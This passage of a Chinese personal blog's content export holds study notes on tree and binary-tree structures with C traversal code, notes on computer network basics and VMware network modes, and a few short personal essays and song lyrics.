class="comment">//后序遍历（左 右 根）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postorder_1</span><span class="params">(bintree t)</span></span>&#123;</span><br><span class="line">    seqstack s;</span><br><span class="line">    s.top = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>((t) || (s.top!=<span class="number">0</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(t)&#123;</span><br><span class="line">            s.data[s.top] = t;</span><br><span class="line">            s.tag[s.top] = <span class="number">0</span>;</span><br><span class="line">            s.top++;</span><br><span class="line">            t = t-&gt;lchild;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.tag[s.top<span class="number">-1</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">            s.top--;</span><br><span class="line">            t = s.data[s.top];</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,t-&gt;data);</span><br><span class="line">            t = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            t = s.data[s.top<span class="number">-1</span>];</span><br><span class="line">            s.tag[s.top<span class="number">-1</span>] = <span class="number">1</span>;</span><br><span class="line">            t = t-&gt;rchild;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>源文件 <code>test.cpp</code></strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;bintree.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;---------------------菜单界面--------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot; \t1.递归遍历             2.非递归遍历       \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;                                                 \n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------0.退出----------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> select;</span><br><span class="line">    bintree t;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请根据前序遍历结果输入二叉树的 结点值（空子树使用 # 代替）：\n&quot;</span>);</span><br><span class="line">	t = createbintree();</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		Menu();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">		<span class="keyword">switch</span>(select)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//递归遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">				preorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">				inorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">				postorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:		<span class="comment">//递归遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;前序遍历结果：&quot;</span>);</span><br><span class="line">				preorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;中序遍历结果：&quot;</span>);</span><br><span class="line">				inorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;后序遍历结果：&quot;</span>);</span><br><span class="line">				postorder(t);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/11/ieurZmqRlgCPcGt.png" alt="image-20211111233134578"></p>
<p>测试以上图 二叉树 为例：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">前序遍历结果：abdefgc</span><br><span class="line">    输入：abd#<span class="meta">#ef##g##c##</span></span><br><span class="line">中序遍历结果：dbfegac</span><br><span class="line">后序遍历结果：dfgebca</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/13/IvMHoaLZWmV8TyN.png" alt="image-20211113085744734"></p>
<p><img src="https://i.loli.net/2021/11/13/8VzkgG5Pq32cKli.png" alt="image-20211113085800931"></p>
<p><img src="https://i.loli.net/2021/11/13/2mUsZEbpYzlMLHD.png" alt="image-20211113085816823"></p>
<p><img src="https://i.loli.net/2021/11/13/KWZMfnJghjyIqaD.png" alt="image-20211113085827862"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>查无此人</title>
    <url>/2021/10/01/%E6%9F%A5%E6%97%A0%E6%AD%A4%E4%BA%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>村上春树说</p>
<p>“你要记得那些黑暗中默默抱紧你的人，逗你笑的人，陪你彻夜聊天的人，坐车来看望你的人，带</p>
<p>着你四处游荡的人，说想念你的人。是这些人组成你生命中一点一滴的温暖，是这些温暖使你成</p>
<p>为善良的人。”</p>
<p>然后，在评论中我看到了，<br>，<br>，<br>查无此人。。。</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>树型结构</title>
    <url>/2021/10/30/%E6%A0%91%E5%9E%8B%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="树型结构"><a href="#树型结构" class="headerlink" title="树型结构"></a>树型结构</h1><h2 id="1-1-概念"><a href="#1-1-概念" class="headerlink" title="1.1 概念"></a>1.1 概念</h2><p>树：n &gt;= 0  个结点的有限集合，一棵树是由根和它的子树构成，子树又由子树的根和更小的子树构成。</p>
<p>空树：n = 0</p>
<p>森林：一棵树中每个结点的子树多构成的集合，即在森林中的每棵树加上一个共同的根，森林就成为了一颗树。</p>
<hr>
<p>上端结点、下端结点</p>
<p>双亲（父母、前件）</p>
<p>子女（孩子、后件）</p>
<p>兄弟</p>
<p>祖先</p>
<p>子孙</p>
<hr>
<p>某结点的度：该结点所拥有的子女数</p>
<p>树的度：树中所有结点度的最大值</p>
<p>树枝：树中连接两个结点的线段</p>
<p>树的深度（高度）：树的层次数</p>
<hr>
<p>终端结点（叶子结点）：度为 0 的结点</p>
<p>非终端结点（分支结点）：度不为 0 的结点</p>
<p>路径：从某结点开始沿着自上而下的顺序到达另一个结点，称该路径</p>
<p>路径的长度：是所经过的树枝的条数</p>
<p>树形结构的表示方法：括号表示法、嵌套集合表示法、凹入表示法</p>
<p><img src="https://i.loli.net/2021/10/30/Jl2scUvpjQnIqAu.png" alt="image-20211030152824457"></p>
<p><img src="https://i.loli.net/2021/10/30/cdGO7smFBlHT1k4.png" alt="image-20211030152839890"></p>
<p><img src="https://i.loli.net/2021/10/30/g9nOytLS2KNFMhT.png" alt="image-20211030152926106"></p>
<p><img src="https://i.loli.net/2021/10/30/lPRDXKLTpjYtf9s.png" alt="image-20211030152853872"></p>
<hr>
<p>有序树</p>
<p>无序树</p>
<p>例：下面的树，若看成是有序树则不相等；若肯成是无序树，则可看作是相等的。</p>
<p><img src="https://i.loli.net/2021/10/30/myhJ65nSTzoePEK.png" alt="image-20211030152648707"></p>
<h2 id="1-2-树的存储结构"><a href="#1-2-树的存储结构" class="headerlink" title="1.2 树的存储结构"></a>1.2 树的存储结构</h2><h3 id="1-2-1-双亲表示法-—–-一维数组"><a href="#1-2-1-双亲表示法-—–-一维数组" class="headerlink" title="1.2.1 双亲表示法 —– 一维数组"></a>1.2.1 双亲表示法 —– 一维数组</h3><p>data  parent</p>
<p>根结点 双亲 值 定义为 -1，root 位置定为 0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;   <span class="comment">//根据树中结点的具体类型进行定义，这里我们假设是字符型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;	<span class="comment">//结点的类型</span></span><br><span class="line">    <span class="keyword">int</span> parent;		<span class="comment">//结点双亲的下表</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tree</span>&#123;</span></span><br><span class="line">    node treelist[MAXSIZE];	<span class="comment">//存放结点的数组</span></span><br><span class="line">    <span class="keyword">int</span> length,root;   <span class="comment">//树中实际所含结点的个数  根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/oeaRhzFCUY5O8ws.png" alt="image-20211030154321554"></p>
<h3 id="1-2-2-孩子表示法-—–-三种"><a href="#1-2-2-孩子表示法-—–-三种" class="headerlink" title="1.2.2 孩子表示法 —– 三种"></a>1.2.2 孩子表示法 —– 三种</h3><p><strong>指针方式 孩子表示法</strong> —- <strong>指针数组</strong></p>
<p>每个结点：两个域</p>
<p>值域：data </p>
<p>指针数组（每个元素是一个指向该结点子女的指针）：child[m]</p>
<p>度为m的树，其指针数组的大小即是 m</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3  <span class="comment">//树的度数</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">child</span>[<span class="title">m</span>];</span> <span class="comment">//指向子女的指针数组</span></span><br><span class="line">&#125;node,*tree;</span><br><span class="line"></span><br><span class="line">tree root;		<span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/SeQ3faz8ACvqj2R.png" alt="image-20211030154722206"></p>
<p><strong>数组方式 孩子表示法</strong> —- <strong>一维数组</strong></p>
<p>每个结点：域个数不定</p>
<p>值域：data</p>
<p>一维数组：child[m]</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> m 3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 20</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="keyword">int</span> child[m];</span><br><span class="line">&#125;treenode;</span><br><span class="line"></span><br><span class="line">treenode tree[MAXSIZE]; <span class="comment">//存储树结点的数组</span></span><br><span class="line"><span class="keyword">int</span> root;  <span class="comment">//根结点 下标</span></span><br><span class="line"><span class="keyword">int</span> length; <span class="comment">//树中实际所含结点个数</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/pBfqKovTHn976gs.png" alt="image-20211030155400513"></p>
<blockquote>
<p><strong>指针方式和数组方式孩子表示法缺点：</strong></p>
<p>每个结点所含子女个数不知道，不相同，则 child 数组的大小仅仅由 树的度决定，则会造成 空间的闲置与浪费。</p>
<p><strong>解决：链表方式孩子表示法</strong></p>
</blockquote>
<p><strong>链表方式 孩子表示法</strong></p>
<p>每个结点：两个域</p>
<p>值域：data</p>
<p>指针域（指向该结点的第一个子女）</p>
<p>每个结点子女 又 排列起来形成一个单链表，n 个结点 n 个单链表</p>
<p>再使用数组存储单链表的头指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 50</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span>&#123;</span>  <span class="comment">//孩子结点类型：单链表</span></span><br><span class="line">    <span class="keyword">int</span> child;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chnode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;chnode,*chpoint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>    <span class="comment">//树中每个结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    chpoint firstchild;	<span class="comment">//指向第一个子女结点的指针</span></span><br><span class="line">&#125;node;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>		<span class="comment">//树的类型</span></span><br><span class="line">    node treelist[MAXSIZE];</span><br><span class="line">    <span class="keyword">int</span> length,root;  <span class="comment">//树中实际所含结点个数、根结点的位置</span></span><br><span class="line">&#125;tree;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/CgNt4ZrSkA6UiKM.png" alt="image-20211030160016424"></p>
<blockquote>
<p><strong>链表方式孩子表示法</strong> 虽然可以建立动态的链表，但是又要额外需要空间来存放一个指向下一个子女的指针 next，<strong>又增加了空间的开销</strong>。</p>
</blockquote>
<p>应根据实际情况进行存储方式的选择。</p>
<h3 id="1-2-3-孩子兄弟表示法-（二叉树表示法）"><a href="#1-2-3-孩子兄弟表示法-（二叉树表示法）" class="headerlink" title="1.2.3 孩子兄弟表示法 （二叉树表示法）"></a>1.2.3 孩子兄弟表示法 （二叉树表示法）</h3><p>每个结点：三个域     </p>
<p>值域：data</p>
<p>两个指针域：firstchild  rightchild (分别指向该结点的第一个子女和其右兄弟)  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> datatype;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span>  <span class="comment">//树的结点类型</span></span><br><span class="line">    datatype data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">firstchild</span>,*<span class="title">rightsibling</span>;</span>  <span class="comment">//第一个子女、右兄弟</span></span><br><span class="line">&#125;node,*pnode;</span><br><span class="line"></span><br><span class="line">pnode root; <span class="comment">//指向树根结点的指针</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/30/VIs7XdeYLw5HTfx.png" alt="image-20211030161221026"></p>
<h2 id="1-3-树的遍历"><a href="#1-3-树的遍历" class="headerlink" title="1.3 树的遍历"></a>1.3 树的遍历</h2><p>按照某种规定的顺序访问树中每一个结点，且每个结点仅仅只能访问一次</p>
<h3 id="1-3-1-前序遍历-—-根-gt-左-gt-右"><a href="#1-3-1-前序遍历-—-根-gt-左-gt-右" class="headerlink" title="1.3.1 前序遍历 —- 根-&gt;左-&gt;右"></a>1.3.1 前序遍历 —- <code>根-&gt;左-&gt;右</code></h3><h3 id="1-3-2-后序遍历-—-左-gt-右-gt-根"><a href="#1-3-2-后序遍历-—-左-gt-右-gt-根" class="headerlink" title="1.3.2 后序遍历 —- 左-&gt;右-&gt;根"></a>1.3.2 后序遍历 —- <code>左-&gt;右-&gt;根</code></h3><h3 id="1-3-3-层次遍历-—-上至下，左至右"><a href="#1-3-3-层次遍历-—-上至下，左至右" class="headerlink" title="1.3.3 层次遍历 —- 上至下，左至右"></a>1.3.3 层次遍历 —- <code>上至下，左至右</code></h3><p><img src="https://i.loli.net/2021/10/30/52LIEUyk7gorXsZ.png" alt="image-20211030162231970"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>胡适与江冬秀</title>
    <url>/2021/10/01/%E8%83%A1%E9%80%82%E4%B8%8E%E6%B1%9F%E5%86%AC%E7%A7%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>她并非小肚鸡肠，她能容忍胡适的风花雪月，但她就是不愿意原谅，曾经那么信任的两个人，嘴</p>
<p>上说着表哥表妹，背地里却狠狠背叛了她。</p>
<p>张爱玲说：”他们（胡适和江冬秀）是旧式婚姻罕有的幸福例子。”</p>
<p>她看多了旧式婚姻之中女人的悲剧，她绝对不能做怨妇，不能被丈夫牵着鼻子走，而是让胡适在</p>
<p>生活中依赖她，在心中敬重她，在感情上不能轻易放弃她。</p>
<p>胡适和江冬秀弯弯绕绕，终于走向白头功德圆满，他从刚开始的衡量算计，委屈求全，到真正为</p>
<p>江冬秀折服。世人笑他一位西装客娶了小脚女，哪知在江冬秀的人生哲理前，胡适的那些小聪明</p>
<p>真的就不算什么事儿了。</p>
<p>思君不见，倍感思君；别离难忍，忍痛别离。</p>
]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络概念、发展、性能</title>
    <url>/2021/10/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%A6%82%E5%BF%B5%E3%80%81%E5%8F%91%E5%B1%95%E3%80%81%E6%80%A7%E8%83%BD/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://i.loli.net/2021/09/29/8YW4KU7igu1OhPz.png" alt="image-20210929191834740"></p>
<p><img src="https://i.loli.net/2021/09/29/QhLMIUy9F2NGsKm.png" alt="image-20210929191855181"></p>
<h2 id="1-1-计算机网络在信息时代的作用"><a href="#1-1-计算机网络在信息时代的作用" class="headerlink" title="1.1 计算机网络在信息时代的作用"></a>1.1 计算机网络在信息时代的作用</h2><p>21世纪，数字化、网络化、信息化</p>
<p>网络化：三网——-电信网络、计算机网络、有线电视网络</p>
<p>计算机网络：因特网、其它网络（政府专用网络等等）</p>
<p><strong>计算机网络的重要功能：</strong></p>
<ul>
<li><p>连通性：彼此连接，交换信息</p>
</li>
<li><p>共享：信息共享、软硬件共享</p>
</li>
</ul>
<h2 id="1-2-因特网"><a href="#1-2-因特网" class="headerlink" title="1.2 因特网"></a>1.2 因特网</h2><p>网络：Network 结点（交换机 和 计算机） 与 链路 连接，许多计算机 通过 链路 连接在交换机上，之间的—— 交换机</p>
<p>互连网：internet  （Network of Networks） 连接  各个网络，网络与网络 通过路由器 相连 ——- 路由器</p>
<p>因特网：Internet   全球最大的互连网  TCP/IP</p>
<p><strong>因特网发展三个阶段：</strong></p>
<ul>
<li><p>ARPANET 向互连网 发展：</p>
<ul>
<li>1969 年，分组交换</li>
<li>1975 年，互联网</li>
<li>1983 年，因特网 TCP/IP，此时 是未开放的政府性质的网络</li>
</ul>
</li>
<li><p>三级结构的因特网</p>
<ul>
<li>1985 年，三个地区网（校园网等），一个主干网，地区网连接在主干网上</li>
</ul>
</li>
<li><p> 多层次 ISP 结构的因特网  （ISP  因特网服务提供商：端系统通过其连接在因特网）</p>
</li>
</ul>
<p>  由因特网管理机构 分配公网 IP 给 ISP ，然后 ISP 再分配给 端系统，同时 ISP 也是分级的 </p>
<p>  <img src="https://i.loli.net/2021/09/29/FdNSmQTnuh7VrR3.png" alt="image-20210929194601798"></p>
<p>选择本地运营商下载速度快</p>
<p><img src="https://i.loli.net/2021/09/29/HTCXe7l9iFucVGk.png" alt="image-20210929194930259"></p>
<p><img src="https://i.loli.net/2021/09/29/LZSN1lkznXMOhiE.png" alt="image-20210929195123493"></p>
<p><img src="https://i.loli.net/2021/09/29/ywlZ1kLFCsxuTmV.png" alt="image-20210929195256507"></p>
<h2 id="1-3-因特网的组成"><a href="#1-3-因特网的组成" class="headerlink" title="1.3 因特网的组成"></a>1.3 因特网的组成</h2><h3 id="1-3-1-核心部分"><a href="#1-3-1-核心部分" class="headerlink" title="1.3.1 核心部分"></a>1.3.1 核心部分</h3><p><strong>数据交换方式：</strong></p>
<ul>
<li><p><strong>电路交换 Circuit Switching</strong> ：面向连接</p>
<p>举例：打电话</p>
<ol>
<li>建立连接：申请占用通信资源（耗时）</li>
<li>通话过程：一直占用资源</li>
<li>释放连接：释放通信资源（不释放即为 占线）</li>
</ol>
<p>适用于：数据量很大的实时性传输；核心路由器之间可使用。</p>
</li>
<li><p><strong>报文交换 Message Switching</strong></p>
<p>报文比分组长（不分段）</p>
<p>报文交换的时间长</p>
<p>不建立连接</p>
</li>
<li><p><strong>分组交换 Packet Switching</strong>：计算机网络采用该方式实现数据通信</p>
<ol>
<li><p>发送端将需要传输的数据进行分组：每一个分组均由 首部（源地址、目标地址） 和 数据 两部分组成 </p>
</li>
<li><p>接收端 接收每个分组，去掉其首部保留数据，连接在一起，使数据完整</p>
</li>
<li><p>从发送端到接收端：进行分组的转发——由路由器进行选择最佳合适的路径进行转发    </p>
</li>
</ol>
<p>（路由器：存储、转发的功能    暂存、查找转发表、找到要转发的端口）</p>
<p>不需要建立连接，不占线 </p>
<p>优点：高效、迅速、可靠、灵活</p>
<p>缺点：时延、开销</p>
</li>
</ul>
<p><img src="https://i.loli.net/2021/09/29/nscfoZhNGtvegAX.png" alt="image-20210929201927140"></p>
<p><strong>耗时：报文 &gt; 电路 &gt; 分组</strong></p>
<h3 id="1-3-2-边缘部分"><a href="#1-3-2-边缘部分" class="headerlink" title="1.3.2 边缘部分"></a>1.3.2 边缘部分</h3><p><strong>主机之间的通信方式：</strong></p>
<ul>
<li><p><strong>C/S 客户服务器方式：Client/Server</strong></p>
<p>服务器是服务器，客户机是客户机</p>
</li>
<li><p><strong>P2P 对等方式：Peer-to-Peer</strong></p>
<p>客户机也可以是服务器，即是服务器也是客户机</p>
<p>例如：P2P 下载：可以从多个源上下载同一个文件，不需要仅仅从一个服务器上下载</p>
</li>
</ul>
<h2 id="1-4-计算机网络在我国的发展"><a href="#1-4-计算机网络在我国的发展" class="headerlink" title="1.4 计算机网络在我国的发展"></a>1.4 计算机网络在我国的发展</h2><p>1994 年 4 月 20 日，中国正式接入互连网</p>
<h2 id="1-5-计算机网络的类别"><a href="#1-5-计算机网络的类别" class="headerlink" title="1.5 计算机网络的类别"></a>1.5 计算机网络的类别</h2><p><img src="https://i.loli.net/2021/09/29/rn4oItQE9judziC.png" alt="image-20210929203028386"></p>
<p><img src="https://i.loli.net/2021/09/29/9VM6m7hXntDLwfl.png" alt="image-20210929202956297"></p>
<h2 id="1-6-计算机网络的性能"><a href="#1-6-计算机网络的性能" class="headerlink" title="1.6 计算机网络的性能"></a>1.6 计算机网络的性能</h2><p>速率：连接在计算机网络上的主机在数字信道上传送 <strong>数据位数</strong> 的速率  data rate   bit rate</p>
<p>b/s   kb/s   Mb/s   Gb/s</p>
<p>带宽：数据通信领域中，数字信道所能传送的最高数据率</p>
<p>b/s  kb/s  Mb/s  Gb/s</p>
<p>吞吐量：单位时间内通过某个网络（所有路径）的数据量</p>
<p>b/s  Mb/s</p>
<p>时延：发送时延、传播时延、处理时延、排队时延之和 </p>
<p>时延带宽积：传播时延 x 带宽 </p>
<p>往返时间：从发送端发送数据开始，到发送端收到接收端确认 为止   </p>
<p>利用率</p>
<ul>
<li>信道利用率：有数据通过时间/（有加无）数据通过的时间</li>
<li>网络利用率：信道利用率加权平均值</li>
</ul>
<p><img src="https://i.loli.net/2021/09/29/IvD1ObgQ6At9JTC.png" alt="image-20210929212908347"></p>
<p><strong>非性能指标：</strong></p>
<p>费用 、管理与维护、质量、标准化、可靠性、可扩展性、可升级性</p>
]]></content>
      <categories>
        <category>计网</category>
      </categories>
      <tags>
        <tag>计网</tag>
      </tags>
  </entry>
  <entry>
    <title>那一年</title>
    <url>/2021/10/26/%E9%82%A3%E4%B8%80%E5%B9%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>​        那一年放肆的自由</p>
<p>　　就这样牵起你的手</p>
<p>　　不懂什么温柔不顾你的感受</p>
<p>　　寂寞总把我冲昏头</p>
<p>　　是你体谅我的任性要求</p>
<p>　　在别人都放弃了我以后</p>
<p>　　沉默的心为你再次悸动</p>
<p>　　浩瀚宇宙美不胜收</p>
<p>　　只是我不配再把你拥有</p>
<p>　　当你独自面对回忆汹涌</p>
<p>　　那一年雪都下的很沉重</p>
<p>　　不敢回头明知你泪在流</p>
<p>　　泛黄的日记写永久</p>
<p>　　讽刺我现在才会懂</p>
<p>　　怀念你的温柔还有什么感受</p>
<p>　　寂寞让我习惯了痛</p>
<p>　　是你体谅我的任性要求</p>
<p>　　在别人都放弃了我以后</p>
<p>　　沉默的心为你再次悸动</p>
<p>　　浩瀚宇宙美不胜收</p>
<p>　　只是我不配再把你拥有</p>
<p>　　当你独自面对回忆汹涌</p>
<p>　　那一年雪都下的很沉重</p>
<p>　　不敢回头明知你泪在流</p>
<p>　　我们爱到尽头谁都不肯放手</p>
<p>　　不如坏人就由我担当承受</p>
<p>　　不管你懂不懂我成全的疼痛</p>
<p>　　是你体谅我的任性要求</p>
<p>　　在别人都放弃了我以后</p>
<p>　　沉默的心为你再次悸动</p>
<p>　　浩瀚宇宙美不胜收</p>
<p>　　只是我不配把你拥有</p>
<p>　　当你独自面对回忆汹涌</p>
<p>　　那一年雪都下的很沉重</p>
<p>　　不敢回头明知你泪在流</p>
]]></content>
      <categories>
        <category>音乐分享</category>
      </categories>
  </entry>
  <entry>
    <title>虚拟机的网络设置</title>
    <url>/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="虚拟机的网络设置"><a href="#虚拟机的网络设置" class="headerlink" title="虚拟机的网络设置"></a>虚拟机的网络设置</h1><p>VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式</p>
<p>当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置</p>
<p><img src="https://i.loli.net/2021/10/08/RIh78Fy2A4GpOVr.png" alt="image-20211008210437678"></p>
<blockquote>
<ul>
<li><strong>VMnet0</strong> ：用于 Bridged 桥接模式</li>
<li><strong>VMnet8</strong> ：用于 NET 模式</li>
<li><strong>VMnet1</strong> ：用于 Host-Only 模式</li>
</ul>
</blockquote>
<p><img src="https://i.loli.net/2021/10/08/NnEDgAUpr5cLC4f.png" alt="image-20211008201312486"></p>
<ul>
<li><p>可以看到存在 三个 VMnet0   VMnet1  VMnet8</p>
</li>
<li><p>这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。</p>
</li>
<li><p><strong>VMnet0</strong> ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。</p>
</li>
</ul>
<blockquote>
<p><strong>测试：设置 Windows 7 接在 VMnet0 上</strong></p>
</blockquote>
<p><img src="https://i.loli.net/2021/10/08/3U4jLEX6GvbKNgr.png" alt="image-20211008201924965"></p>
<p>我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。</p>
